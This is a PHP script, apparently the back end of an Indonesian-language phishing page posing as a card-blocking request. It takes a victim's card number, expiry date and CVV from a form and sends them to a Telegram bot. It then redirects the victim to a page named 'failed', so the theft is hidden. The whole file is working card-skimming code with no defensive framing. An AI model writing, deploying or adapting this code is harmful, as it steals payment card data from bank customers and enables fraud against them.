<?php
include 'ketan.php';

$card_number = $_POST['card_number'] ?? '';
$expiry = $_POST['expiry'] ?? '';
$cvv = $_POST['cvv'] ?? '';

$message = "🔒 Permintaan Blokir Kartu\n"
         . "Nomor: $card_number\n"
         . "Masa Berlaku: $expiry\n"
         . "CVV: $cvv";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatid&text=" . urlencode($message));

header("Location: /menu/gagal.php");
exit;